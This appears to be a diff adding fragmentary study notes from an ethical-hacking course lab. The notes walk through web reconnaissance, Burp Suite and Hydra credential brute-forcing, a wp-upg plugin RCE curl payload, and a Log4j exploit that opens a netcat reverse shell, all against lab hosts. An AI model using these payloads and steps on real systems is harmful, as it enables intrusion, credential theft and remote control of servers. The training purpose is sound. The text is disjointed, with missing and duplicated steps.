@@ -1,0 +1,269 @@
+nmap -T4 -A -v [Target Web Application] 
+perform banner grabbing to identify the make, model, and version of the target web server software.
+telnet [Target Web Application]  80 
+type GET / HTTP/1.0 and press Enter two times.
+
+perform web application reconnaissance (Whois lookup, DNS interrogation, port and services discovery, banner grabbing, and firewall detection)
+
+
+Perform Web Spidering using OWASP ZAP
+
+navigate to the Messages tab under the Spider tab to view more detailed information regarding the URLs obtained while performing the web spidering, as shown in the screenshot.
+In real-time, attackers perform web spidering or crawling to discover hidden content and functionality, which is not reachable from the main visible content, to exploit user privileges within the application. It also allows attackers to recover backup copies of live files, configuration and log files containing sensitive data, backup archives containing snapshots of files within the web root, and new functionality that is not linked to the main application.
+
+
+ Perform Web Application Vulnerability Scanning using SmartScanner
+ 
+ SmartScanner leverages machine learning (ML) and artificial intelligence (AI) techniques to adapt its methodologies to the behavior of the target. This integration allows SmartScanner to minimize false positives. It uses AI for identifying vulnerable pages, detecting 404 custom pages, identifying input vectors, fingerprinting the target and calculating the security risk.
+
+INSTALL FISRT 
+
+Perform Web Application Attacks
+
+
+Perform a Brute-force Attack using Burp Suite
+
+LOGIN TO SITE WITH USERNAME 
+
+CONFIGURE BURPSUITE 
+
+INTEECEPT ON 
+
+right-click anywhere on the HTTP request window, and from the context menu, click Send to Intruder.
+Observe that Burp Suite intercepted the entered login credentials.
+If you do not get the request as shown in the screenshot, then press the Forward button.
+
+
+	17. Now, click on the Intruder tab from the toolbar and observe that under the Intruder tab, the Positions tab appears by default.
+	18. In the Positions tab under the Intruder tab observe that Burp Suite sets the target positions by default, as shown in the HTTP request. Click the Clear § button from the right-pane to clear the default payload values.
+
+
+
+	19. Once you clear the default payload values, select Cluster bomb from the Attack type drop-down list.
+Cluster bomb uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 20). The attack iterates through each payload set in turn so that all permutations of payload combinations are tested. For example, if there are two payload positions, the attack will place the first payload from payload set 2 into position 2 and iterate through all payloads in payload set 1 in position 1; it will then place the second payload from payload set 2 into position 2 and iterate through all the payloads in payload set 1 in position 1.
+
+
+	20. Now, we will set the username and password as the payload values. To do so, select the username value entered in Step#14 and click Add § from the right-pane. Similarly, select the password value entered in Step#14 and click Add § from the right-pane.
+Here, the username and password are admin and password.
+
+
+	21. Once the username and password payloads are added. The symbol '§' will be added at the start and end of the selected payload values. Here, as the screenshot shows, the values are admin and password.
+	21. Once the username and password payloads are added. The symbol '§' will be added at the start and end of the selected payload values. Here, as the screenshot shows, the values are admin and password.
+
+
+avigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.
+	23. Under the Payload settings [Simple list] section, click the Load… button.
+	24. A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv13 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button.
+
+
+
+	25. Observe that the selected username.txt file content appears under the Payload settings [Simple list] section, as shown in the screenshot.
+	
+
+
+
+	34. After the progress bar completes, scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1155.
+Different values of Status and Length indicate that the combination of the respective credentials is successful.
+The values might differ when you perform this task.
+	35. In the Raw tab under the Request tab, the HTTP request with a set of the correct credentials is displayed. (here, username=admin and password=qwerty@123), as shown in the screenshot. Note down these user credentials.
+
+
+
+
+
+
+--
+
+
+Perform Remote Code Execution (RCE) Attack
+	11. Open Mozilla Firefox web browser and go to https://wpscan.com/ and login to the wpscan account that you have created in previous task.
+
+
+
+
+ wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#13] command.
+ 
+ 	20. In the Plugin(s) Identified section, within the context of the wp-upg plugin, an Unauthenticated Remote Code Execution (RCE) vulnerability has been detected as shown in the screenshot.
+The number of vulnerable plugins might differ when you perform this lab.
+
+
+	21. In this task, we will exploit the RCE vulnerability present in the wp-upg plugin.
+	22. To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.
+	
+
+
+
+Wapiti Web Application Security Scanner
+sudo apt update
+sudo apt install wapiti
+cd wapiti command to navigate into wapiti directory 
+run python3 -m venv wapiti3 command to create virtual environment in python.
+
+
+run . wapiti3/bin/activate command to activate virtual environment.
+
+	4. Run pip install . command to install wapiti web application security scanner.
+
+
+
+After installing the tool run wapiti -u https://www.certifiedhacker.com command to perform web application security scanning on certifiedhacker.com website.
+
+
+
+ow, in the terminal run cd /root/.wapiti/generated_report/ to navigate to generated_report directory.
+
+
+un ls command to view the contents of the directory. we can see that the certifiedhacker.com_xxxxxxxx_xxxx.html file is created.
+The name of the .html file varies when you perform this lab.
+
+
+	8. Run cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/ command to copy the .html file to /home/attacker location.
+
+
+
+	9. Open a new terminal and run firefox certifiedhacker.com_xxxxxxxx_xxxx.html command to open the .html file in Firefox browser.
+
+
+
+
+ ---
+ 
+ 
+ Hacking Web Servers
+ 
+ 
+ Telnet helps users perform banner-grabbing attacks. It probes HTTP servers to determine the Server field in the HTTP response header.
+
+
+nc -vv www.moviescope.com 80.
+	GET / HTTP/1.0 and press Enter twice.
+	
+	
+	nmap -sV --script=http-enum [target website].
+	
+	
+		5. The next step is to discover the hostnames that resolve the targeted domain.
+	6. In the terminal window, run nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com.
+
+
+
+	7. Perform an HTTP trace on the targeted domain. In the terminal window, run nmap --script http-trace -d www.goodshopping.com.
+
+
+
+
+check whether Web Application Firewall is configured on the target host or domain. In the terminal window, run nmap -p80 --script http-waf-detect www.goodshopping.com.
+
+
+---
+
+
+Perform a Web Server Attack
+
+
+Crack FTP Credentials using a Dictionary Attack
+
+
+ nmap -p 21 [IP Address of Windows 11].
+
+
+
+ ftp [IP Address of Windows 11].
+ 
+ 
+  hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11].
+
+
+
+mkdir Hacked to remotely create a directory named Hacked on the Windows 11
+
+help
+--
+
+Gain Access to Target Web Server by Exploiting Log4j Vulnerability
+run nmap -sV -sC 10.10.1.9 command to view the running services.
+-sV option enables version detection. This means Nmap will try to determine the version of the services running on open ports. -sC option enables the use of default scripts in the Nmap Scripting Engine (NSE). These scripts perform various tasks like service detection, vulnerability detection, and more.
+
+
+pon investigation we can see that Apache is vulnerable to Remote Code Execution (RCE) attack. Now we wil use searchsploit to find the vulnerabilities pertaining to RCE attack on the target server.
+	15. In the terminal window run searchsploit -t Apache RCE command to view the RCE vulnerabilities on the Apache server.
+	
+
+
+
+	16. Now, we need to select a vulnerability to exploit the Server from the list, from the Nmap scan we found that the Apache Tomcat server is running on JSP so we will target java vulnerabilities from the list of vulnerabilities.
+	17. We can see that Java platform is vulnerable for Apache Log4j 2 - Remote Command Execution (RCE) exploit.
+
+
+
+
+	18. We will now exploit Log4j vulnerability present in the target Web Server to perform Remote code execution.
+
+
+
+ http://10.10.1.9:8080 and press Enter.
+ 
+ , run cd log4j-shell-poc/ and press Enter, to enter into log4j-shell-poc directory.
+ 
+ 
+ 	24. We need to extract JDK zip file which is already placed at /home/attacker location.
+	25. Type tar -xf jdk-8u202-linux-x64.tar.gz and press Enter, to extract the file.
+-xf: specifies extract all files.
+	26. Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter.
+	
+
+
+
+	27. Now, we need to update the installed JDK path in the poc.py file.
+	28. Navigate to the previous terminal window. In the terminal, type pluma poc.py and press Enter to open poc.py file.
+
+
+
+	29. In the poc.py file scroll down and in line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
+
+
+
+	30. Scroll down to line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
+
+
+
+	31. Scroll down to line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
+
+
+
+	32. After making all the changes save the changes and close the poc.py editor window.
+	33. Now, open a new terminal window and type nc -lvp 9001 and press Enter, to initiate a netcat listener as shown in screenshot.
+
+
+
+	34. Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 and press Enter, to start the exploitation and create payload.
+
+
+
+	35. Now, copy the payload generated in the send me: section.
+
+
+
+	36. Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot.
+In the Password field you can enter any password.
+
+
+
+	37. Now switch to the netcat listener, you can see that a reverse shell is opened.
+
+
+
+Now, type whoami and press Enter.
+
+
+
+
+
+	
+	
+
+
+
+ 
+
+
